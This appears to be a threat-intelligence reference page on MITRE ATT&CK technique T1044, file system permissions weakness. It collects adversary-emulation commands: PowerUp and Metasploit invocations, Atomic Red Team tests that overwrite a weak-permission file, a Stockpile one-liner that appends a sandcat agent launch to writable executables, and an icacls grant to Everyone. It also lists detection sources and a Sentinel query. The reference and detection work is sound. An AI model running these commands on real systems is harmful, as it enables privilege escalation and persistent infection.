
# File System Permissions Weakness

## Description

### MITRE Description

> Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.

Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.

### Services

Manipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.

### Executable Installers

Another variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)

## Aliases

```

```

## Additional Attributes

* Bypass: None
* Effective Permissions: ['SYSTEM', 'User', 'Administrator']
* Network: None
* Permissions: ['Administrator', 'User']
* Platforms: ['Windows']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1044

## Potential Commands

```
Check for common privilege escalation methods:
*upload PowerUp.ps1 to victim disk*
powershell.exe -epbypass PowerUp.ps1
Invoke-AllChecks
powershell-import /path/to/PowerUp.ps1
powershell Invoke-AllChecks
exploit/windows/local/trusted_service_path
Get-WmiObject win32_service | select PathName
Copy-Item #{malicious_file} -Destination $env:TEMP\T1044_weak_permission_file.txt -Force

Get-WmiObject win32_service | select PathName
Copy-Item $env:TEMP\T1044\T1044_malicious_file.txt -Destination #{weak_permission_file} -Force

{'darwin': {'sh': {'command': 'find / -type f -size -500k -maxdepth 5 -perm -333 2>/dev/null -exec sh -c \'grep -qF "54NDC47_SCRIPT" "{}" || echo "#54NDC47_SCRIPT\\n" "chmod +x sandcat.go-darwin && sandcat.go-darwin" >> "{}"; ls "{}" \' \\; | echo "complete"\n', 'payloads': ['sandcat.go']}}, 'linux': {'sh': {'command': 'find / -type f -size -500k -maxdepth 5 -perm -333 2>/dev/null -exec sh -c \'grep -qF "54NDC47_SCRIPT" "{}" || echo "#54NDC47_SCRIPT\\n" "chmod +x sandcat.go-linux && sandcat.go-linux" >> "{}"; ls "{}" \' \\; | echo "complete"\n', 'payloads': ['sandcat.go']}}}
*.exe /grant Everyone:F /T /C /Q 
icacls.exe
python/situational_awareness/host/multi/SuidGuidSearch
python/situational_awareness/host/multi/SuidGuidSearch
python/situational_awareness/host/multi/WorldWriteableFileSearch
python/situational_awareness/host/multi/WorldWriteableFileSearch
```

## Commands Dataset

```
[{'command': 'Check for common privilege escalation methods:\n'
             '*upload PowerUp.ps1 to victim disk*\n'
             'powershell.exe -epbypass PowerUp.ps1\n'
             'Invoke-AllChecks',
  'name': 'Built-in Windows Command',
  'source': 'https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx'},
 {'command': 'powershell-import /path/to/PowerUp.ps1\n'
             'powershell Invoke-AllChecks',
  'name': 'Cobalt Strike',
  'source': 'https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx'},
 {'command': 'exploit/windows/local/trusted_service_path',
  'name': 'Metasploit',
  'source': 'https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx'},
 {'command': 'Get-WmiObject win32_service | select PathName\n'
             'Copy-Item #{malicious_file} -Destination '
             '$env:TEMP\\T1044_weak_permission_file.txt -Force\n',
  'name': None,
  'source': 'atomics/T1044/T1044.yaml'},
 {'command': 'Get-WmiObject win32_service | select PathName\n'
             'Copy-Item $env:TEMP\\T1044\\T1044_malicious_file.txt '
             '-Destination #{weak_permission_file} -Force\n',
  'name': None,
  'source': 'atomics/T1044/T1044.yaml'},
 {'command': {'darwin': {'sh': {'command': 'find / -type f -size -500k '
                                           '-maxdepth 5 -perm -333 2>/dev/null '
                                           "-exec sh -c 'grep -qF "
                                           '"54NDC47_SCRIPT" "{}" || echo '
                                           '"#54NDC47_SCRIPT\\n" "chmod +x '
                                           'sandcat.go-darwin && '
                                           'sandcat.go-darwin" >> "{}"; ls '
                                           '"{}" \' \\; | echo "complete"\n',
                                'payloads': ['sandcat.go']}},
              'linux': {'sh': {'command': 'find / -type f -size -500k '
                                          '-maxdepth 5 -perm -333 2>/dev/null '
                                          "-exec sh -c 'grep -qF "
                                          '"54NDC47_SCRIPT" "{}" || echo '
                                          '"#54NDC47_SCRIPT\\n" "chmod +x '
                                          'sandcat.go-linux && '
                                          'sandcat.go-linux" >> "{}"; ls "{}" '
                                          '\' \\; | echo "complete"\n',
                               'payloads': ['sandcat.go']}}},
  'name': 'Locate and infect files with weak but executable perms',
  'source': 'data/abilities/privilege-escalation/10681f2f-be03-44af-858d-f2b0812df185.yml'},
 {'command': '*.exe /grant Everyone:F /T /C /Q ',
  'name': None,
  'source': 'Threat Hunting Tables'},
 {'command': 'icacls.exe',
  'name': 'sub_process_1',
  'source': 'Threat Hunting Tables'},
 {'command': 'python/situational_awareness/host/multi/SuidGuidSearch',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'python/situational_awareness/host/multi/SuidGuidSearch',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'python/situational_awareness/host/multi/WorldWriteableFileSearch',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'python/situational_awareness/host/multi/WorldWriteableFileSearch',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'}]
```

## Potential Detections

```json
[{'data_source': ['4663', 'File monitoring']},
 {'data_source': ['4688 ', 'Process CMD Line']},
 {'data_source': ['7040', ' 7045', 'Services']},
 {'data_source': ['4663', 'File monitoring']},
 {'data_source': ['4688 ', 'Process CMD Line']},
 {'data_source': ['7040', ' 7045', 'Services']}]
```

## Potential Queries

```json
[{'name': 'File System Permissions Weakness',
  'product': 'Azure Sentinel',
  'query': 'Sysmon| where EventID == 7 and (module_loaded contains '
           '"\\\\Temp\\\\"or module_loaded contains "C:\\\\Users\\\\"or '
           'driver_signature_status !contains "Valid")'}]
```

## Raw Dataset

```json
[{'Mitre APT3 Adversary Emulation Field Manual': {'Built-in Windows Command': 'Check '
                                                                              'for '
                                                                              'common '
                                                                              'privilege '
                                                                              'escalation '
                                                                              'methods:\n'
                                                                              '*upload '
                                                                              'PowerUp.ps1 '
                                                                              'to '
                                                                              'victim '
                                                                              'disk*\n'
                                                                              'powershell.exe '
                                                                              '-epbypass '
                                                                              'PowerUp.ps1\n'
                                                                              'Invoke-AllChecks',
                                                  'Category': 'T1044',
                                                  'Cobalt Strike': 'powershell-import '
                                                                   '/path/to/PowerUp.ps1\n'
                                                                   'powershell '
                                                                   'Invoke-AllChecks',
                                                  'Description': 'PowerUp.ps1 '
                                                                 'is a '
                                                                 'powershell '
                                                                 'script from '
                                                                 'the '
                                                                 'PowerSploit '
                                                                 'project on '
                                                                 'github by '
                                                                 'PowershellMafia. '
                                                                 'The '
                                                                 'Invoke-AllChecks '
                                                                 'commandlet '
                                                                 'checks for '
                                                                 'many common '
                                                                 'privilege '
                                                                 'escalation '
                                                                 'options such '
                                                                 'as unquoted '
                                                                 'service '
                                                                 'paths, '
                                                                 'writeable '
                                                                 'service '
                                                                 'directories, '
                                                                 'service '
                                                                 'information '
                                                                 'manipulation, '
                                                                 'always '
                                                                 'install '
                                                                 'elevated, '
                                                                 'etc. Each '
                                                                 'specific '
                                                                 'kind of '
                                                                 'escalation '
                                                                 'technique '
                                                                 'supplies its '
                                                                 'own method '
                                                                 'of abusing '
                                                                 'it.',
                                                  'Metasploit': 'exploit/windows/local/trusted_service_path'}},
 {'Atomic Red Team Test - File System Permissions Weakness': {'atomic_tests': [{'auto_generated_guid': '0cb5ad48-7d61-48ac-bd4e-503d5b519dac',
                                                                                'dependencies': [{'description': 'A '
                                                                                                                 'file '
                                                                                                                 'must '
                                                                                                                 'exist '
                                                                                                                 'on '
                                                                                                                 'disk '
                                                                                                                 'at '
                                                                                                                 'specified '
                                                                                                                 'location '
                                                                                                                 '(#{weak_permission_file})\n',
                                                                                                  'get_prereq_command': 'New-Item '
                                                                                                                        '#{weak_permission_file} '
                                                                                                                        '-Force '
                                                                                                                        '| '
                                                                                                                        'Out-Null\n'
                                                                                                                        'Set-Content '
                                                                                                                        '-Path '
                                                                                                                        '#{weak_permission_file} '
                                                                                                                        '-Value '
                                                                                                                        '"T1044 '
                                                                                                                        'Weak '
                                                                                                                        'permission '
                                                                                                                        'file"\n',
                                                                                                  'prereq_command': 'if '
                                                                                                                    '(Test-Path '
                                                                                                                    '#{weak_permission_file}) '
                                                                                                                    '{exit '
                                                                                                                    '0} '
                                                                                                                    'else '
                                                                                                                    '{exit '
                                                                                                                    '1}\n'},
                                                                                                 {'description': 'A '
                                                                                                                 'file '
                                                                                                                 'to '
                                                                                                                 'replace '
                                                                                                                 'the '
                                                                                                                 'original '
                                                                                                                 'weak_permission_file. '
                                                                                                                 'In '
                                                                                                                 'an '
                                                                                                                 'attack '
                                                                                                                 'this '
                                                                                                                 'would '
                                                                                                                 'be '
                                                                                                                 'the '
                                                                                                                 'malicious '
                                                                                                                 'file '
                                                                                                                 'gaining '
                                                                                                                 'extra '
                                                                                                                 'privileges\n',
                                                                                                  'get_prereq_command': 'New-Item '
                                                                                                                        '-Type '
                                                                                                                        'Directory '
                                                                                                                        '-Path '
                                                                                                                        '$env:TEMP\\T1044\\ '
                                                                                                                        '-Force '
                                                                                                                        '| '
                                                                                                                        'Out-Null\n'
                                                                                                                        'New-Item '
                                                                                                                        '#{malicious_file} '
                                                                                                                        '-Force '
                                                                                                                        '| '
                                                                                                                        'Out-Null\n'
                                                                                                                        'Set-Content '
                                                                                                                        '-Path '
                                                                                                                        '#{malicious_file} '
                                                                                                                        '-Value '
                                                                                                                        '"T1044 '
                                                                                                                        'Malicious '
                                                                                                                        'file"\n',
                                                                                                  'prereq_command': 'if '
                                                                                                                    '(Test-Path '
                                                                                                                    '#{malicious_file}) '
                                                                                                                    '{exit '
                                                                                                                    '0} '
                                                                                                                    'else '
                                                                                                                    '{exit '
                                                                                                                    '1}\n'}],
                                                                                'dependency_executor_name': 'powershell',
                                                                                'description': 'This '
                                                                                               'test '
                                                                                               'to '
                                                                                               'show '
                                                                                               'checking '
                                                                                               'file '
                                                                                               'system '
                                                                                               'permissions '
                                                                                               'weakness '
                                                                                               'and '
                                                                                               'which '
                                                                                               'can '
                                                                                               'lead '
                                                                                               'to '
                                                                                               'privilege '
                                                                                               'escalation '
                                                                                               'by '
                                                                                               'replacing '
                                                                                               'malicious '
                                                                                               'file. '
                                                                                               'Example; '
                                                                                               'check '
                                                                                               'weak '
                                                                                               'file '
                                                                                               'permission '
                                                                                               'and '
                                                                                               'then '
                                                                                               'replace.\n'
                                                                                               'powershell '
                                                                                               '-c '
                                                                                               '"Get-WmiObject '
                                                                                               'win32_service '
                                                                                               '| '
                                                                                               'select '
                                                                                               'PathName"   '
                                                                                               '(check '
                                                                                               'service '
                                                                                               'file '
                                                                                               'location) '
                                                                                               'and\n'
                                                                                               'copy '
                                                                                               '/Y '
                                                                                               'C:\\temp\\payload.exe '
                                                                                               'C:\\ProgramData\\folder\\Update\\weakpermissionfile.exe   '
                                                                                               '( '
                                                                                               'replace '
                                                                                               'weak '
                                                                                               'permission '
                                                                                               'file '
                                                                                               'with '
                                                                                               'malicious '
                                                                                               'file '
                                                                                               ')\n'
                                                                                               '\n'
                                                                                               'Upon '
                                                                                               'execution, '
                                                                                               'open '
                                                                                               'the '
                                                                                               'weak '
                                                                                               'permission '
                                                                                               'file '
                                                                                               'at '
                                                                                               '%temp%\\T1044_weak_permission_file.txt '
                                                                                               'and '
                                                                                               'verify '
                                                                                               'that '
                                                                                               "it's "
                                                                                               'contents '
                                                                                               'read '
                                                                                               '"T1044 '
                                                                                               'Malicious '
                                                                                               'file". '
                                                                                               'To '
                                                                                               'verify\n'
                                                                                               'the '
                                                                                               'weak '
                                                                                               'file '
                                                                                               'permissions, '
                                                                                               'open '
                                                                                               'File '
                                                                                               'Explorer '
                                                                                               'to%temp%\\T1044_weak_permission_file.exe '
                                                                                               'then '
                                                                                               'open '
                                                                                               'Properties '
                                                                                               'and '
                                                                                               'Security '
                                                                                               'to '
                                                                                               'view '
                                                                                               'the '
                                                                                               'Full '
                                                                                               'Control '
                                                                                               'permission '
                                                                                               'is '
                                                                                               'enabled.\n',
                                                                                'executor': {'cleanup_command': 'Remove-Item '
                                                                                                                '#{weak_permission_file} '
                                                                                                                '-Force '
                                                                                                                '-ErrorAction '
                                                                                                                'Ignore\n'
                                                                                                                'Remove-Item '
                                                                                                                '-Recurse '
                                                                                                                '(Split-Path '
                                                                                                                '#{malicious_file}) '
                                                                                                                '-Force '
                                                                                                                '-ErrorAction '
                                                                                                                'Ignore\n',
                                                                                             'command': 'Get-WmiObject '
                                                                                                        'win32_service '
                                                                                                        '| '
                                                                                                        'select '
                                                                                                        'PathName\n'
                                                                                                        'Copy-Item '
                                                                                                        '#{malicious_file} '
                                                                                                        '-Destination '
                                                                                                        '#{weak_permission_file} '
                                                                                                        '-Force\n',
                                                                                             'elevation_required': False,
                                                                                             'name': 'powershell'},
                                                                                'input_arguments': {'malicious_file': {'default': '$env:TEMP\\T1044\\T1044_malicious_file.txt',
                                                                                                                       'description': 'File '
                                                                                                                                      'to '
                                                                                                                                      'replace '
                                                                                                                                      'weak '
                                                                                                                                      'permission '
                                                                                                                                      'file '
                                                                                                                                      'with',
                                                                                                                       'type': 'path'},
                                                                                                    'weak_permission_file': {'default': '$env:TEMP\\T1044_weak_permission_file.txt',
                                                                                                                             'description': 'check '
                                                                                                                                            'weak '
                                                                                                                                            'files '
                                                                                                                                            'permission',
                                                                                                                             'type': 'path'}},
                                                                                'name': 'File '
                                                                                        'System '
                                                                                        'Permissions '
                                                                                        'Weakness',
                                                                                'supported_platforms': ['windows']}],
                                                              'attack_technique': 'T1044',
                                                              'display_name': 'File '
                                                                              'System '
                                                                              'Permissions '
                                                                              'Weakness'}},
 {'Mitre Stockpile - Locate and infect files with weak but executable perms': {'description': 'Locate '
                                                                                              'and '
                                                                                              'infect '
                                                                                              'files '
                                                                                              'with '
                                                                                              'weak '
                                                                                              'but '
                                                                                              'executable '
                                                                                              'perms',
                                                                               'id': '10681f2f-be03-44af-858d-f2b0812df185',
                                                                               'name': 'Weak '
                                                                                       'executable '
                                                                                       'files',
                                                                               'platforms': {'darwin': {'sh': {'command': 'find '
                                                                                                                          '/ '
                                                                                                                          '-type '
                                                                                                                          'f '
                                                                                                                          '-size '
                                                                                                                          '-500k '
                                                                                                                          '-maxdepth '
                                                                                                                          '5 '
                                                                                                                          '-perm '
                                                                                                                          '-333 '
                                                                                                                          '2>/dev/null '
                                                                                                                          '-exec '
                                                                                                                          'sh '
                                                                                                                          '-c '
                                                                                                                          "'grep "
                                                                                                                          '-qF '
                                                                                                                          '"54NDC47_SCRIPT" '
                                                                                                                          '"{}" '
                                                                                                                          '|| '
                                                                                                                          'echo '
                                                                                                                          '"#54NDC47_SCRIPT\\n" '
                                                                                                                          '"chmod '
                                                                                                                          '+x '
                                                                                                                          'sandcat.go-darwin '
                                                                                                                          '&& '
                                                                                                                          'sandcat.go-darwin" '
                                                                                                                          '>> '
                                                                                                                          '"{}"; '
                                                                                                                          'ls '
                                                                                                                          '"{}" '
                                                                                                                          "' "
                                                                                                                          '\\; '
                                                                                                                          '| '
                                                                                                                          'echo '
                                                                                                                          '"complete"\n',
                                                                                                               'payloads': ['sandcat.go']}},
                                                                                             'linux': {'sh': {'command': 'find '
                                                                                                                         '/ '
                                                                                                                         '-type '
                                                                                                                         'f '
                                                                                                                         '-size '
                                                                                                                         '-500k '
                                                                                                                         '-maxdepth '
                                                                                                                         '5 '
                                                                                                                         '-perm '
                                                                                                                         '-333 '
                                                                                                                         '2>/dev/null '
                                                                                                                         '-exec '
                                                                                                                         'sh '
                                                                                                                         '-c '
                                                                                                                         "'grep "
                                                                                                                         '-qF '
                                                                                                                         '"54NDC47_SCRIPT" '
                                                                                                                         '"{}" '
                                                                                                                         '|| '
                                                                                                                         'echo '
                                                                                                                         '"#54NDC47_SCRIPT\\n" '
                                                                                                                         '"chmod '
                                                                                                                         '+x '
                                                                                                                         'sandcat.go-linux '
                                                                                                                         '&& '
                                                                                                                         'sandcat.go-linux" '
                                                                                                                         '>> '
                                                                                                                         '"{}"; '
                                                                                                                         'ls '
                                                                                                                         '"{}" '
                                                                                                                         "' "
                                                                                                                         '\\; '
                                                                                                                         '| '
                                                                                                                         'echo '
                                                                                                                         '"complete"\n',
                                                                                                              'payloads': ['sandcat.go']}}},
                                                                               'tactic': 'privilege-escalation',
                                                                               'technique': {'attack_id': 'T1044',
                                                                                             'name': 'File '
                                                                                                     'System '
                                                                                                     'Permissions '
                                                                                                     'Weakness'}}},
 {'Threat Hunting Tables': {'chain_id': '100125',
                            'commandline_string': '/grant Everyone:F /T /C /Q ',
                            'file_path': '',
                            'file_value': '',
                            'frequency': 'low',
                            'itw_sample': 'ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa',
                            'loaded_dll': '',
                            'mitre_attack': 'T1044',
                            'mitre_caption': 'file_systems_permissions_weakness',
                            'os': 'windows',
                            'parent_process': '*.exe',
                            'registry_path': '',
                            'registry_value': '',
                            'sub_process_1': 'icacls.exe',
                            'sub_process_2': ''}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1044',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"python/situational_awareness/host/multi/SuidGuidSearch":  '
                                                                                 '["T1044"],',
                                            'Empire Module': 'python/situational_awareness/host/multi/SuidGuidSearch',
                                            'Technique': 'File System '
                                                         'Permissions '
                                                         'Weakness'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1044',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"python/situational_awareness/host/multi/WorldWriteableFileSearch":  '
                                                                                 '["T1044"],',
                                            'Empire Module': 'python/situational_awareness/host/multi/WorldWriteableFileSearch',
                                            'Technique': 'File System '
                                                         'Permissions '
                                                         'Weakness'}}]
```

# Tactics


* [Persistence](../tactics/Persistence.md)

* [Privilege Escalation](../tactics/Privilege-Escalation.md)
    

# Mitigations

None

# Actors

None
